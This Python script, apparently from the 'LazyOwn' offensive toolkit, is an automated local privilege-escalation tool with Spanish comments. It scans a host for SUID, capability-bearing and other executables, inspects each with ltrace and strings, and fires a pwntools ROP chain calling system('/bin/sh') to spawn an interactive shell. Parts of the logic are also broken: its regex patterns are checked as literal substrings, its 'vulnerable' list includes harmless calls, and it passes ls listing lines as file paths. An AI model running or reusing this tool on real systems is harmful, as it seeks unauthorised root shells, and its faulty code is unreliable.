import subprocess
from pwn import *

BANNER = """
                                                                                              L.            
             i                                                   t                            EW:        ,ft
            LE              ..                        f.     ;WE.ED.                 ;        E##;       t#E
           L#E             ;W,      ,##############Wf.E#,   i#G  E#K:              .DL        E###t      t#E
          G#W.            j##,       ........jW##Wt   E#t  f#f   E##W;     f.     :K#L     LWLE#fE#f     t#E
         D#K.            G###,             tW##Kt     E#t G#i    E#E##t    EW:   ;W##L   .E#f E#t D#G    t#E
        E#K.           :E####,           tW##E;       E#jEW,     E#ti##f   E#t  t#KE#L  ,W#;  E#t  f#E.  t#E
      .E#E.           ;W#DG##,         tW##E;         E##E.      E#t ;##D. E#t f#D.L#L t#K:   E#t   t#K: t#E
     .K#E            j###DW##,      .fW##D,           E#G        E#ELLE##K:E#jG#f  L#LL#G     E#t    ;#W,t#E
    .K#D            G##i,,G##,    .f###D,             E#t        E#L;;;;;;,E###;   L###j      E#t     :K#D#E
   .W#G           :K#K:   L##,  .f####Gfffffffffff;   E#t        E#t       E#K:    L#W;       E#t      .E##E
  :W##########Wt ;##D.    L##, .fLLLLLLLLLLLLLLLLLi   EE.        E#t       EG      LE.        ..         G#E
  :,,,,,,,,,,,,,.,,,      .,,                         t                    ;       ;@                     fE
                                                                                                           ,
[*] Iniciando: LazyOwn LazyPwn [;,;]
"""
print(BANNER)

class BinaryFinder:
    def __init__(self):
        self.binaries = []

    def find_suid_binaries(self):
        print("[*] Buscando binarios con permisos SUID...")
        try:
            output = subprocess.check_output(['find', '/', '-type', 'f', '-perm', '-4000', '-exec', 'ls', '-la', '{}', ';'], stderr=subprocess.DEVNULL)
            self.process_output(output)
        except subprocess.CalledProcessError:
            print("[-] Error al ejecutar el comando.")

    def find_capabilities_binaries(self):
        print("[*] Buscando binarios con capacidades...")
        try:
            output = subprocess.check_output(['getcap', '-r', '/'], stderr=subprocess.DEVNULL)
            self.process_output(output)
        except subprocess.CalledProcessError:
            print("[-] Error al ejecutar el comando.")

    def find_executable_binaries(self):
        print("[*] Buscando binarios ejecutables...")
        try:
            output = subprocess.check_output(['find', '/', '-type', 'f', '-executable', '-exec', 'ls', '-la', '{}', ';'], stderr=subprocess.DEVNULL)
            self.process_output(output)
        except subprocess.CalledProcessError:
            print("[-] Error al ejecutar el comando.")

    def find_specific_name_binaries(self, names):
        print("[*] Buscando binarios con nombres específicos...")
        for name in names:
            try:
                output = subprocess.check_output(['find', '/', '-type', 'f', '-name', f'*{name}*'], stderr=subprocess.DEVNULL)
                self.process_output(output)
            except subprocess.CalledProcessError:
                print(f"[-] Error al ejecutar el comando para {name}.")

    def process_output(self, output):
        lines = output.decode().split('\n')
        for line in lines:
            if line:
                self.binaries.append(line.strip())

    def get_found_binaries(self):
        return self.binaries

class BinaryAttacker:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.ltrace_output = None
        self.strings_output = None

    def analyze_with_ltrace(self):
        print("[*] Analizando el binario con ltrace...")
        try:
            self.ltrace_output = subprocess.check_output(['ltrace', '-s', '1000', self.binary_path], stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            print("[-] Error al ejecutar el comando ltrace.")

    def extract_strings(self):
        print("[*] Extrayendo strings del binario...")
        try:
            self.strings_output = subprocess.check_output(['strings', self.binary_path], stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            print("[-] Error al ejecutar el comando strings.")

    def prepare_attack(self):
        print("[*] Preparando el ataque...")

        # Verificar si se analizó el binario con ltrace y se extrajeron las cadenas
        if not self.ltrace_output or not self.strings_output:
            print("[-] Debes analizar el binario primero con ltrace y extraer las cadenas.")
            return

        # Buscar funciones específicas o cadenas vulnerables en la salida de ltrace y en las cadenas extraídas
        # Lista consolidada de funciones vulnerables
        vulnerable_functions = [
            r'\bgets\b', r'\bstrcpy\b', r'\bstrncpy\b', r'\bstrcat\b', r'\bstrncat\b',
            r'\bsprintf\b', r'\bsnprintf\b', r'\bvprintf\b', r'\bvsprintf\b', r'\bvsnprintf\b',
            r'\bscanf\b', r'\bvscanf\b', r'\bfscanf\b', r'\bsscanf\b', r'\bvsscanf\b',
            r'\bsystem\b', r'\bpopen\b', r'\bexec\b', r'\bexecl\b', r'\bexecle\b',
            r'\bexeclp\b', r'\bexecv\b', r'\bexecve\b', r'\bexecvp\b', r'\bexecvpe\b',
            r'\bstrtok\b', r'\bstrtok_r\b', r'\bstrlen\b', r'\bstrcmp\b', r'\bstrncmp\b',
            r'\bstrcasecmp\b', r'\bstrncasecmp\b', r'\bstrsep\b', r'\bstrpbrk\b', r'\bstrspn\b',
            r'\bstrcspn\b', r'\bstrcoll\b', r'\bstrxfrm\b', r'\bstrechr\b', r'\bstrnrchr\b',
            r'\bstrecoll\b', r'\bstrend\b', r'\bstrnend\b', r'\bstrnext\b', r'\bstrnnext\b',
            r'\bstrnicmp\b', r'\bstrchrnul\b', r'\bstrcasestr\b', r'\bstrlcpy\b', r'\bstrlcat\b',
            r'\bmemcpy\b', r'\bmemmove\b', r'\bmemset\b', r'\bmemcmp\b', r'\bbcopy\b', 
            r'\bbcmp\b', r'\bbzero\b', r'\bmemccpy\b', r'\bmemchr\b', r'\bmemrchr\b',
            r'\bmemfrob\b', r'\bmempcpy\b', r'\bmemmem\b', r'\bmemalign\b', r'\bposix_memalign\b',
            r'\baligned_alloc\b', r'\bvalloc\b', r'\bpvalloc\b', r'\bmcheck\b', r'\bmprobe\b',
            r'\bmtrace\b', r'\bmuntrace\b', r'\bstrdup\b', r'\bstrndup\b', r'\bstrstr\b',
            r'\bstrnstr\b', r'\bcat\b', r'\bsh\b', r'\bbash\b', r'\bchmod\b', r'\bchown\b',
            r'\bchgrp\b', r'\bunlink\b', r'\bremove\b', r'\brmdir\b', r'\bmkdir\b', r'\bmkfifo\b',
            r'\bmknod\b', r'\bmount\b', r'\bumount\b', r'\bkill\b', r'\bsignal\b', r'\bsigaction\b',
            r'\bsigprocmask\b', r'\bsigsuspend\b', r'\bsigwait\b', r'\bsigwaitinfo\b', r'\bsigset\b',
            r'\bsiglongjmp\b', r'\bsigpending\b', r'\bsigqueue\b', r'\bsigaltstack\b', r'\bsiginterrupt\b',
            r'\bsigpause\b', r'\bsigrelse\b', r'\bsigreturn\b', r'\bsigsend\b', r'\bsigsuspend\b',
            r'\bsigvec\b', r'\bsigblock\b', r'\bsigsetmask\b', r'\bsigmask\b', r'\bmtrace\b',
            r'\bmuntrace\b', r'\bmprobe\b', r'\bmcheck\b', r'\bmtrace\b'
        ]

        # Lista consolidada de cadenas vulnerables
        vulnerable_strings = [
            "gets", "strcpy", "strncpy", "strcat", "strncat",
            "sprintf", "snprintf", "vprintf", "vsprintf", "vsnprintf",
            "scanf", "vscanf", "fscanf", "sscanf", "vsscanf",
            "system", "popen", "exec", "execl", "execle",
            "execlp", "execv", "execve", "execvp", "execvpe",
            "strtok", "strtok_r", "strlen", "strcmp", "strncmp",
            "strcasecmp", "strncasecmp", "strsep", "strpbrk", "strspn",
            "strcspn", "strcoll", "strxfrm", "strechr", "strnrchr",
            "strecoll", "strend", "strnend", "strnext", "strnnext",
            "strnicmp", "strchrnul", "strcasestr", "strlcpy", "strlcat",
            "memcpy", "memmove", "memset", "memcmp", "bcopy", 
            "bcmp", "bzero", "memccpy", "memchr", "memrchr",
            "memfrob", "mempcpy", "memmem", "memalign", "posix_memalign",
            "aligned_alloc", "valloc", "pvalloc", "mcheck", "mprobe",
            "mtrace", "muntrace", "strdup", "strndup", "strstr",
            "strnstr", "cat", "sh", "bash", "chmod", "chown",
            "chgrp", "unlink", "remove", "rmdir", "mkdir", "mkfifo",
            "mknod", "mount", "umount", "kill", "signal", "sigaction",
            "sigprocmask", "sigsuspend", "sigwait", "sigwaitinfo", "sigset",
            "siglongjmp", "sigpending", "sigqueue", "sigaltstack", "siginterrupt",
            "sigpause", "sigrelse", "sigreturn", "sigsend", "sigsuspend",
            "sigvec", "sigblock", "sigsetmask", "sigmask", "mtrace",
            "muntrace", "mprobe", "mcheck", "mtrace"
        ]


        # Buscar funciones vulnerables en la salida de ltrace
        for line in self.ltrace_output.decode().split('\n'):
            for func in vulnerable_functions:
                if func in line:
                    print(f"[+] Función vulnerable encontrada en ltrace: {line}")
                    # Aquí puedes implementar la lógica para construir el payload en consecuencia
                    self.exploit_with_pwntools()

        # Buscar cadenas vulnerables en las cadenas extraídas
        for line in self.strings_output.decode().split('\n'):
            for string in vulnerable_strings:
                if string in line:
                    print(f"[+] Cadena vulnerable encontrada: {line}")
                    # Aquí puedes implementar la lógica para construir el payload en consecuencia
                    self.exploit_with_pwntools()

    def exploit_with_pwntools(self):
        # Aquí puedes utilizar las funcionalidades de pwntools para construir y ejecutar el exploit
        # Ejemplo básico:
        elf = ELF(self.binary_path)
        rop = ROP(elf)
        rop.call('system', [next(elf.search(b'/bin/sh'))])
        payload = rop.chain()
        p = process(self.binary_path)
        p.sendline(payload)
        p.interactive()

def main():
    # Crear una instancia de BinaryFinder
    finder = BinaryFinder()

    # Realizar las búsquedas
    finder.find_suid_binaries()
    finder.find_capabilities_binaries()
    finder.find_executable_binaries()
    finder.find_specific_name_binaries(['ssh', 'ftp', 'telnet'])

    # Obtener los binarios encontrados
    binaries = finder.get_found_binaries()

    # Mostrar los resultados
    print("[*] Binarios encontrados:")
    for binary in binaries:
        print(binary)

        # Atacar cada binario encontrado
        attacker = BinaryAttacker(binary)
        attacker.analyze_with_ltrace()
        attacker.extract_strings()
        attacker.prepare_attack()

if __name__ == "__main__":
    main()
